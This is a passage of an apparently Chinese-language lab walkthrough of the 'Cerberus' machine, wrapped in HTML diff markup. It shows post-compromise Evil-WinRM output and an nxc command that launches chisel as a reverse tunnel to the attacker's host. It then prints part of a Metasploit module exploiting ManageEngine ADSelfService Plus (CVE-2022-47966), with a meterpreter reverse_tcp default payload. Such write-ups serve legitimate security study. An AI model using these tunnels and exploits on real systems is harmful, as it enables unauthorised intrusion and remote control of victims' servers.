+</span></span><span style="display:flex;"><span>                                                                                                                                     
+</span></span><span style="display:flex;"><span>Group Name                                  Type             SID          Attributes                                                 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">============</span> <span style="color:#f92672">==================================================</span>         
+</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\C</span>ertificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group         
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\M</span>edium Plus Mandatory Level Label            S-1-16-8448
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User claims unknown.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
+</span></span></code></pre></div><p>查看已启用的进程。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew<span style="color:#ae81ff">\D</span>esktop&gt; netstat -ano | findstr LISTEN                                                              
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                             
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">952</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                             
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                             
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">952</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:808            0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1724</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:1500           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1724</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:1501           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1724</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:2179           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3248</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>                                                             
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4192</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:9251           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4192</span>                                                          
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2560</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">532</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1232</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">1728</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>                                                           
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49907          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">672</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:49911          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:53671          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2720</span>
+</span></span><span style="display:flex;"><span>  TCP    0.0.0.0:61155          0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2164</span>
+</span></span><span style="display:flex;"><span>  TCP    10.129.232.100:53      0.0.0.0:0              LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    10.129.232.100:139     0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:32000        0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2456</span>
+</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:33308        0.0.0.0:0              LISTENING       <span style="color:#ae81ff">2292</span>
+</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:49894        0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4192</span>
+</span></span><span style="display:flex;"><span>  TCP    172.16.22.1:53         0.0.0.0:0              LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    172.16.22.1:139        0.0.0.0:0              LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:88                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:135               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">952</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:389               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:443               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:445               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:464               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:593               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">952</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:636               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>    TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:808               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:1500              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:1501              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:2179              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">3248</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:3268              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:3269              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:5985              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:9389              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2560</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:47001             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49664             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">532</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49665             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1232</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49666             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">1728</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49667             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49673             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49674             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49678             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">700</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49907             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">672</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:49911             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:53671             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2720</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:61155             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2164</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:53               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>::1<span style="color:#f92672">]</span>:33308            <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">2292</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>dead:beef::174<span style="color:#f92672">]</span>:53    <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>dead:beef::e5aa:ae97:590c:395a<span style="color:#f92672">]</span>:53  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>fe80::48af:2355:a041:da88%5<span style="color:#f92672">]</span>:53  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span><span style="display:flex;"><span>  TCP    <span style="color:#f92672">[</span>fe80::e225:edaa:5112:dfc3%6<span style="color:#f92672">]</span>:53  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:0                 LISTENING       <span style="color:#ae81ff">724</span>
+</span></span></code></pre></div><p>准备好 windows 版的 chisel。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah ../../Tools/chisel/chisel.exe
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3553151</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali root 8.3M Nov  <span style="color:#ae81ff">3</span> 22:40 ../../Tools/chisel/chisel.exe
+</span></span></code></pre></div><p>上传至 matthew。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew&gt; dir c.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>atthew
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        11/3/2026   7:40 PM        <span style="color:#ae81ff">8676864</span> c.exe
+</span></span></code></pre></div><p>宿主的防火墙只对 icinga 放行 5985，所以隧道必须有 DC 自己发起、目标写成 <code>127.0.0.1</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm 127.0.0.1 -u matthew -p <span style="color:#e6db74">&#39;147258369&#39;</span> -x <span style="color:#e6db74">&#34;C:\Users\matthew\c.exe client 10.10.16.151:8000 R:9251:127.0.0.1:9251&#34;</span>
+</span></span><span style="display:flex;"><span>WINRM       127.0.0.1       <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cerberus.local<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       127.0.0.1       <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cerberus.local<span style="color:#ae81ff">\m</span>atthew:147258369 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       127.0.0.1       <span style="color:#ae81ff">5985</span>   DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Execute command failed, current user: <span style="color:#e6db74">&#39;cerberus.local\matthew&#39;</span> has no <span style="color:#e6db74">&#39;Invoke&#39;</span> rights to execute command <span style="color:#f92672">(</span>shell type: cmd<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>将 msf 的模块复制下来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cp /usr/share/metasploit-framework/modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb ~/.msf4/modules/exploits/multi/http/adssp_saml_v2.rb
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cerberus<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ vim ~/.msf4/modules/exploits/multi/http/adssp_saml_v2.rb
+</span></span></code></pre></div><p>做一些改动。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># This module requires Metasploit: https://metasploit.com/download</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Current source: https://github.com/rapid7/metasploit-framework</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>class MetasploitModule &lt; Msf::Exploit::Remote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Rank <span style="color:#f92672">=</span> ExcellentRanking
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  include Msf::Exploit::Remote::HttpClient
+</span></span><span style="display:flex;"><span>  include Msf::Exploit::CmdStager
+</span></span><span style="display:flex;"><span>  prepend Msf::Exploit::Remote::AutoCheck
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  def initialize<span style="color:#f92672">(</span>info <span style="color:#f92672">=</span> <span style="color:#f92672">{})</span>
+</span></span><span style="display:flex;"><span>    super<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>      update_info<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        info,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Name&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;ManageEngine ADSelfService Plus Unauthenticated SAML RCE&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Description&#39;</span> <span style="color:#f92672">=</span>&gt; %q<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          This exploits an unauthenticated remote code execution vulnerability
+</span></span><span style="display:flex;"><span>          that affects Zoho ManageEngine AdSelfService Plus versions <span style="color:#ae81ff">6210</span> and
+</span></span><span style="display:flex;"><span>          below <span style="color:#f92672">(</span>CVE-2022-47966<span style="color:#f92672">)</span>. Due to a dependency to an outdated library
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">(</span>Apache Santuario version 1.4.1<span style="color:#f92672">)</span>, it is possible to execute arbitrary
+</span></span><span style="display:flex;"><span>          code by providing a crafted <span style="color:#e6db74">`</span>samlResponse<span style="color:#e6db74">`</span> XML to the ADSelfService Plus
+</span></span><span style="display:flex;"><span>          SAML endpoint. Note that the target is only vulnerable <span style="color:#66d9ef">if</span> it has been
+</span></span><span style="display:flex;"><span>          configured with SAML-based SSO at least once in the past, regardless of
+</span></span><span style="display:flex;"><span>          the current SAML-based SSO status.
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Author&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;Khoa Dinh&#39;</span>, <span style="color:#75715e"># Original research</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;horizon3ai&#39;</span>, <span style="color:#75715e"># PoC</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;Christophe De La Fuente&#39;</span> <span style="color:#75715e"># Metasploit module</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;License&#39;</span> <span style="color:#f92672">=</span>&gt; MSF_LICENSE,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;References&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;CVE&#39;</span>, <span style="color:#e6db74">&#39;2022-47966&#39;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;https://blog.viettelcybersecurity.com/saml-show-stopper/&#39;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/&#39;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;https://github.com/horizon3ai/CVE-2022-47966&#39;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;URL&#39;</span>, <span style="color:#e6db74">&#39;https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis&#39;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Payload&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#39;BadChars&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;\x27&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Targets&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Windows EXE Dropper&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Platform&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;win&#39;</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Arch&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>ARCH_X86, ARCH_X64<span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Type&#39;</span> <span style="color:#f92672">=</span>&gt; :windows_dropper,
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;DefaultOptions&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span> <span style="color:#e6db74">&#39;Payload&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;windows/x64/meterpreter/reverse_tcp&#39;</span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Windows Command&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Platform&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;win&#39;</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Arch&#39;</span> <span style="color:#f92672">=</span>&gt; ARCH_CMD,
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#39;Type&#39;</span> <span style="color:#f92672">=</span>&gt; :windows_command,
